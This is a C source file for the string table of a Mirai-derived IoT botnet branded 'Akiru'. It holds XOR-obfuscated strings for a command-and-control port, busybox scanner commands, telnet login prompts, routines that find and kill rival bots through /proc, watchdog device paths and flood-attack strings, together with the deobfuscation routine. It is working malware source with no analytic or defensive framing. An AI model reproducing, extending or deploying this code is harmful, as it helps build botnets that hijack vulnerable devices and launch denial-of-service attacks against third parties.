#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdf7ecadf;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
	// scanner and domain shit!!
	
    // 3175
    add_entry(TABLE_CNC_PORT, "\xB8\xD3", 2);
    // 62947
    add_entry(TABLE_SCAN_CB_PORT, "\x41\x57", 2);
    // Infected By Akiru
    add_entry(TABLE_EXEC_SUCCESS, "\xFD\xDA\xD2\xD1\xD7\xC0\xD1\xD0\x94\xF6\xCD\x94\xF5\xDF\xDD\xC6\xC1\xB4", 18);
    // shell
    add_entry(TABLE_SCAN_SHELL, "\xC7\xDC\xD1\xD8\xD8\xB4", 6);
    // enable
    add_entry(TABLE_SCAN_ENABLE, "\xD1\xDA\xD5\xD6\xD8\xD1\xB4", 7);
    // system
    add_entry(TABLE_SCAN_SYSTEM, "\xC7\xCD\xC7\xC0\xD1\xD9\xB4", 7);
    // sh
    add_entry(TABLE_SCAN_SH, "\xC7\xDC\xB4", 3);
    // /bin/busybox Akiru
    add_entry(TABLE_SCAN_QUERY, "\x9B\xD6\xDD\xDA\x9B\xD6\xC1\xC7\xCD\xD6\xDB\xCC\x94\xF5\xDF\xDD\xC6\xC1\xB4", 19);
    // Akiru: applet not found
    add_entry(TABLE_SCAN_RESP, "\xF5\xDF\xDD\xC6\xC1\x8E\x94\xD5\xC4\xC4\xD8\xD1\xC0\x94\xDA\xDB\xC0\x94\xD2\xDB\xC1\xDA\xD0\xB4", 4);
    // ncorrect
    add_entry(TABLE_SCAN_NCORRECT, "\xDA\xD7\xDB\xC6\xC6\xD1\xD7\xC0\xB4", 9);
    // /bin/busybox ps
    add_entry(TABLE_SCAN_PS, "\x9B\xD6\xDD\xDA\x9B\xD6\xC1\xC7\xCD\xD6\xDB\xCC\x94\xC4\xC7\xB4", 16);
    // /bin/busybox kill -9 
    add_entry(TABLE_SCAN_KILL_9, "\x9B\xD6\xDD\xDA\x9B\xD6\xC1\xC7\xCD\xD6\xDB\xCC\x94\xDF\xDD\xD8\xD8\x94\x99\x8D\xB4", 22);
	
	// killer shit!!
	
    // /proc/
    add_entry(TABLE_KILLER_PROC, "\x9B\xC4\xC6\xDB\xD7\x9B\xB4", 7);
    // /exe
    add_entry(TABLE_KILLER_EXE, "\x9B\xD1\xCC\xD1\xB4", 5);
    // /fd
    add_entry(TABLE_KILLER_FD, "\x9B\xD2\xD0\xB4", 4);
    // /maps
    add_entry(TABLE_KILLER_MAPS, "\x9B\xD9\xD5\xC4\xC7\xB4", 6);
    // /proc/net/tcp
    add_entry(TABLE_KILLER_TCP, "\x9B\xC4\xC6\xDB\xD7\x9B\xDA\xD1\xC0\x9B\xC0\xD7\xC4\xB4", 14);
	// /status
	add_entry(TABLE_KILLER_STATUS, "\x9B\xC7\xC0\xD5\xC0\xC1\xC7\xB4", 8);
	// .anime
	add_entry(TABLE_KILLER_ANIME, "\x9A\xD5\xDA\xDD\xD9\xD1\xB4", 7);
	// /proc/net/route
    add_entry(TABLE_MEM_ROUTE, "\x9B\xC4\xC6\xDB\xD7\x9B\xDA\xD1\xC0\x9B\xC6\xDB\xC1\xC0\xD1\xB4", 16);
	// /proc/cpuinfo
    add_entry(TABLE_MEM_CPUINFO, "\x9B\xC4\xC6\xDB\xD7\x9B\xD7\xC4\xC1\xDD\xDA\xD2\xDB\xB4", 14);
	// BOGOMIPS
    add_entry(TABLE_MEM_BOGO, "\xF6\xFB\xF3\xFB\xF9\xFD\xE4\xE7\xB4", 9);
	// /etc/rc.d/rc.local
	add_entry(TABLE_MEM_RC, "\x9B\xD1\xC0\xD7\x9B\xC6\xD7\x9A\xD0\x9B\xC6\xD7\x9A\xD8\xDB\xD7\xD5\xD8\xB4", 19);
	// g1abc4dmo35hnp2lie0kjf
	add_entry(TABLE_MEM_MASUTA1, "\xD3\x85\xD5\xD6\xD7\x80\xD0\xD9\xDB\x87\x81\xDC\xDA\xC4\x86\xD8\xDD\xD1\x84\xDF\xDE\xD2\xB4", 23);
	// /dev/watchdog
	add_entry(TABLE_MEM_MIRAI1, "\x9B\xD0\xD1\xC2\x9B\xC3\xD5\xC0\xD7\xDC\xD0\xDB\xD3\xB4", 14);
	// /dev/misc/watchdog
	add_entry(TABLE_MEM_MIRAI2, "\x9B\xD0\xD1\xC2\x9B\xD9\xDD\xC7\xD7\x9B\xC3\xD5\xC0\xD7\xDC\xD0\xDB\xD3\xB4", 19);
	// /dev/FTWDT101_watchdog
	add_entry(TABLE_MEM_VAMP1, "\x9B\xD0\xD1\xC2\x9B\xF2\xE0\xE3\xF0\xE0\x85\x84\x85\xEB\xC3\xD5\xC0\xD7\xDC\xD0\xDB\xD3\xB4", 23);
	// /dev/FTWDT101\ watchdog
    add_entry(TABLE_MEM_VAMP2, "\x9B\xD0\xD1\xC2\x9B\xF2\xE0\xE3\xF0\xE0\x85\x84\x85\xE8\x94\xC3\xD5\xC0\xD7\xDC\xD0\xDB\xD3\xB4", 24);
	// /dev/netslink/
	add_entry(TABLE_MEM_VAMP3, "\x9B\xD0\xD1\xC2\x9B\xDA\xD1\xC0\xC7\xD8\xDD\xDA\xDF\x9B\xB4", 15);
    // PRIVMSG
    add_entry(TABLE_MEM_IRC1, "\xE4\xE6\xFD\xE2\xF9\xE7\xF3\xB4", 8);
    // GETLOCALIP
    add_entry(TABLE_MEM_QBOT1, "\xF3\xF1\xE0\xF8\xFB\xF7\xF5\xF8\xFD\xE4\xB4", 11);
    // KILLATTK
    add_entry(TABLE_MEM_QBOT2, "\xFF\xFD\xF8\xF8\xF5\xE0\xE0\xFF\xB4", 9);
    // Eats8
    add_entry(TABLE_MEM_IRC2, "\xF1\xD5\xC0\xC7\x8C\xB4", 6);
    // V[Ov
    add_entry(TABLE_MEM_MIRAI3, "\xE2\xEF\xFB\xC2\xB4", 5);
    // /proc/self/exe
    add_entry(TABLE_MEM_EXE, "\x9B\xC4\xC6\xDB\xD7\x9B\xC7\xD1\xD8\xD2\x9B\xD1\xCC\xD1\xB4", 15);
	// dvrHelper
    add_entry(TABLE_MAPS_MIRAI, "\xD0\xC2\xC6\xFC\xD1\xD8\xC4\xD1\xC6\xB4", 10);
	
	
	// methods shit!!

    // TSource Engine Query
    add_entry(TABLE_ATK_VSE, "\xE0\xE7\xDB\xC1\xC6\xD7\xD1\x94\xF1\xDA\xD3\xDD\xDA\xD1\x94\xE5\xC1\xD1\xC6\xCD\xB4", 21);
    // /etc/resolv.conf
    add_entry(TABLE_ATK_RESOLVER, "\x9B\xD1\xC0\xD7\x9B\xC6\xD1\xC7\xDB\xD8\xC2\x9A\xD7\xDB\xDA\xD2\xB4", 17);
    // nameserver 
    add_entry(TABLE_ATK_NSERV, "\xDA\xD5\xD9\xD1\xC7\xD1\xC6\xC2\xD1\xC6\xB4", 11);
	
	// strings encryption shit!!

	// /dev/watchdog
	add_entry(TABLE_MISC_WATCHDOG, "\x9B\xD0\xD1\xC2\x9B\xC3\xD5\xC0\xD7\xDC\xD0\xDB\xD3\xB4", 14);
	// /dev/misc/watchdog
	add_entry(TABLE_MISC_WATCHDOG2, "\x9B\xD0\xD1\xC2\x9B\xD9\xDD\xC7\xD7\x9B\xC3\xD5\xC0\xD7\xDC\xD0\xDB\xD3\xB4", 19);
	// assword
	add_entry(TABLE_SCAN_ASSWORD, "\xD5\xC7\xC7\xC3\xDB\xC6\xD0\xB4", 8);
	// ogin
	add_entry(TABLE_SCAN_OGIN, "\xDB\xD3\xDD\xDA\xB4", 5);
	// enter
	add_entry(TABLE_SCAN_ENTER, "\xD1\xDA\xC0\xD1\xC6\xB4", 6);
	// 1gba2cdon53nhp12ti0kfj
	add_entry(TABLE_MISC_RAND, "\x85\xD3\xD6\xD5\x86\xD7\xD0\xDB\xDA\x81\x87\xDA\xDC\xC4\x85\x86\xC0\xDD\x84\xDF\xD2\xDE\xB4", 23);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}

